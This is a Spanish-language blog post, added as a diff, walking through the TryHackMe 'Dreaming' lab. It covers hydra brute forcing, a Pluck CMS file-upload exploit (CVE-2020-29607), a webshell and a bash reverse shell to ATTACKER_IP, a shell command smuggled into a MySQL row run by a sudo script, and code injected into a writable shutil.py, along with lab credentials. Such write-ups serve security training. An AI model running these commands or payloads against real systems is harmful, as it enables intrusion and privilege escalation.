@@ -1,0 +1,280 @@
+---
+title: 'Dreaming'
+description: 'Explotación de Pluck CMS, una inyección SQL creativa y escalada de privilegios abusando de un script Python ejecutable por sudo con librería editable.'
+publishDate: 2026-08-30
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Dificultad:** Easy **Tema:** Explotación web (Pluck CMS), SQL Injection creativa, Privilege Escalation (sudo, librería Python compartida)
+
+---
+
+## 1. Preparación del espacio de trabajo
+
+Antes de empezar, se organiza el entorno de trabajo con carpetas separadas para escaneos, contenido descargado, scripts, loot (credenciales/hallazgos) y exploits.
+
+```bash
+mkdir -p dreaming/{scans,content,scripts,loot,exploits} && cd dreaming
+settarget {IP}
+```
+
+---
+
+## 2. Escaneo de puertos
+
+Se realiza un escaneo completo de puertos (`-p-`) sin resolución DNS (`-n`), mostrando solo puertos abiertos (`--open`), en formato grepable (`-oG`) para poder extraer los puertos fácilmente después.
+
+```bash
+nmap -p- --open -T4 -v -n target -oG scans/initial-scan
+extractPorts scans/initial-scan
+```
+
+**Resultado:** se identifican los puertos **22 (SSH)** y **80 (HTTP)** abiertos.
+
+---
+
+## 3. Enumeración web y fuerza bruta del login
+
+Al explorar el puerto 80 se encuentra un panel de login correspondiente a **Pluck CMS 4.7.13**, ubicado en `/app/pluck-4.7.13/login.php`. Se utiliza `hydra` contra el formulario para probar credenciales:
+
+```bash
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/app/pluck-4.7.13/login.php/:user=^USER^&pass=^PASS^:invalid" -t 4
+```
+
+> **Nota:** Pluck CMS normalmente no distingue un campo de usuario (solo tiene una contraseña de administrador única), pero se mantiene la sintaxis estándar de `http-post-form` para el ataque.
+
+**Credenciales obtenidas:**
+
+- Usuario: `admin`
+- Contraseña: `password`
+
+---
+
+## 4. Explotación (RCE en Pluck CMS 4.7.13)
+
+Pluck CMS 4.7.13 es vulnerable a **Remote Code Execution autenticado vía subida de archivos** (CVE-2020-29607, EDB-ID 49909). El exploit abusa de la función de gestión de archivos del CMS para subir un webshell (p0wny-shell) disfrazado de un tipo de archivo permitido.
+
+```bash
+# Descargar el exploit de:
+# https://www.exploit-db.com/exploits/49909
+
+python3 exploit.py TARGET_IP 80 password /app/pluck-4.7.13
+```
+
+El script inicia sesión con las credenciales encontradas, sube el webshell, e imprime la ruta donde quedó alojado.
+
+### 4.1 Obtención de shell interactiva
+
+Con el listener de netcat preparado:
+
+```bash
+nc -nvlp 4444
+```
+
+Se accede al webshell subido por el exploit:
+
+```
+http://TARGET_IP/app/pluck-4.7.13/files/shell.phar
+```
+
+Desde la interfaz de p0wny-shell se dispara una reverse shell en bash hacia el listener:
+
+```bash
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+```
+
+### 4.2 Estabilización de la terminal
+
+Una reverse shell básica no soporta control de trabajos, autocompletado ni señales correctamente. Se estabiliza con el método clásico de PTY + `stty raw`:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```
+Ctrl + z
+```
+
+```bash
+stty raw -echo; fg
+```
+
+```
+Enter
+```
+
+```bash
+export TERM=xterm
+```
+
+---
+
+## 5. Enumeración automatizada con LinPEAS
+
+Para acelerar la búsqueda de vectores de escalada de privilegios, se transfiere y ejecuta `linpeas.sh`.
+
+**En Kali (descarga y servidor HTTP):**
+
+```bash
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+python3 -m http.server 8000
+```
+
+**En la víctima (descarga y ejecución):**
+
+```bash
+curl http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+```
+
+Se guarda la salida completa en un archivo para revisarla con calma:
+
+```bash
+/tmp/linpeas.sh > /tmp/linpeas_output.txt 2>&1
+```
+
+**Recuperar el reporte hacia Kali:**
+
+```bash
+# En la víctima, sirve el archivo:
+python3 -m http.server 8001 --directory /tmp
+
+# En Kali:
+curl http://TARGET_IP:8001/linpeas_output.txt -o linpeas_output.txt
+cat linpeas_output.txt
+```
+
+---
+
+## 6. Escalada a `lucien`
+
+Durante la enumeración manual (buscando archivos con permisos de `lucien`), se localiza un script de prueba en `/opt/` que contiene credenciales en texto plano, reutilizadas por el administrador para probar el login de Pluck CMS:
+
+```bash
+cat /opt/test.py
+```
+
+**Credenciales obtenidas:**
+
+- Usuario: `lucien`
+- Contraseña: `HeyLucien#@1999!`
+
+### 6.1 Acceso por SSH y primera flag
+
+```bash
+ssh lucien@TARGET_IP
+cat lucien_flag.txt
+```
+
+### 6.2 Enumeración adicional como `lucien`
+
+Revisando el historial de comandos del usuario, se encuentra la contraseña de conexión a MySQL:
+
+```bash
+ls -lah
+cat .bash_history
+```
+
+**Credencial obtenida:** contraseña de MySQL → `lucien42DBPASSWORD`
+
+---
+
+## 7. Escalada a `death` (SQL Injection creativa vía sudo)
+
+Se confirma con `sudo -l` (paso realizado previamente en la investigación) que `lucien` puede ejecutar como `death`, sin contraseña:
+
+```
+(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
+```
+
+Este script lee y muestra el contenido de una tabla MySQL llamada `dreams` (columnas `dreamer` y `dream`). Como `lucien` tiene acceso a esa misma base de datos, es posible **insertar una fila maliciosa** que, al ser procesada por el script (ejecutado como `death`), termine ejecutando comandos del sistema.
+
+### 7.1 Conexión a la base de datos
+
+```bash
+mysql -u lucien -plucien42DBPASSWORD
+show databases;
+use library;
+show tables;
+select * from dreams;
+```
+
+### 7.2 Inyección del payload
+
+Se inserta una fila cuyo contenido, al ser interpretado por el script vulnerable, ejecuta un comando de shell — en este caso, leer el propio código fuente del script para obtener la contraseña de `death` en texto plano:
+
+```sql
+insert into dreams (dreamer, dream) values ('cat /home/death/getDreams.py | bash', '-l');
+```
+
+### 7.3 Disparo de la ejecución
+
+De vuelta en la sesión SSH como `lucien`, se ejecuta el script con privilegios de `death` vía sudo:
+
+```bash
+sudo -u death /usr/bin/python3 /home/death/getDreams.py
+```
+
+La salida del script, al procesar la fila inyectada, imprime el propio código fuente de `getDreams.py` — revelando la contraseña de `death`:
+
+**Credencial obtenida:** `!mementoMORI666!`
+
+### 7.4 Acceso y segunda flag
+
+```bash
+su death
+cat death_flag.txt
+```
+
+---
+
+## 8. Escalada a `morpheus` (manipulación de librería Python compartida)
+
+En el home de `morpheus` se identifica un script de restauración (`restore.py`) que utiliza la librería estándar `shutil` (específicamente la función `copy2()`). Se busca la ubicación real de esa librería en el sistema:
+
+```bash
+find / -type f -name shutil.py 2>/dev/null
+ls -lah /usr/lib/python3.8/shutil.py
+```
+
+Al confirmar que el usuario `death` tiene permisos de escritura sobre `shutil.py`, se inyecta código malicioso dentro de la función `copy2()` (justo después de los comentarios/docstring y antes del primer `if`):
+
+```python
+import os
+os.system('chmod 777 /home/morpheus/morpheus_flag.txt')
+```
+
+**Razonamiento:** el proceso de restauración de `morpheus` corre periódicamente con privilegios elevados y utiliza internamente `shutil.copy2()`. Al modificar la librería compartida, el próximo ciclo de restauración ejecuta el código inyectado con esos privilegios, otorgando permisos de lectura sobre la flag.
+
+Tras esperar a que el proceso de restauración se dispare, se obtiene la tercera flag:
+
+```bash
+cat /home/morpheus/morpheus_flag.txt
+```
+
+---
+
+## 9. Resumen del camino de ataque
+
+1. Escaneo de puertos → **22 (SSH)** y **80 (HTTP)** abiertos.
+2. Fuerza bruta con `hydra` sobre el login de Pluck CMS → `admin:password`.
+3. Explotación de **CVE-2020-29607** (RCE autenticado en Pluck CMS 4.7.13) → subida de webshell.
+4. Reverse shell + estabilización de terminal → acceso como `www-data`.
+5. Enumeración con LinPEAS y manual → credenciales de `lucien` en `/opt/test.py`.
+6. SSH como `lucien` → primera flag.
+7. `sudo -l` revela permiso para ejecutar `getDreams.py` como `death` → SQL injection en tabla `dreams` para leer el código fuente del script y obtener la contraseña de `death`.
+8. `su death` → segunda flag.
+9. Librería `shutil.py` escribible por `death` → inyección de comando que se ejecuta cuando el proceso de restauración de `morpheus` corre con privilegios elevados → tercera flag.
+
+---
+
+## 10. Lecciones aprendidas
+
+- **Reutilización de credenciales** entre servicios (CMS, SSH, MySQL) fue la causa raíz de varias escaladas.
+- Un script que **imprime datos de una base de datos sin sanitizar** puede convertirse en un vector de ejecución de comandos si su salida es interpretada por un shell (`| bash`).
+- Tener **permisos de escritura sobre una librería compartida** del sistema (como una librería estándar de Python) equivale a poder ejecutar código arbitrario con los privilegios de cualquier proceso que la importe.
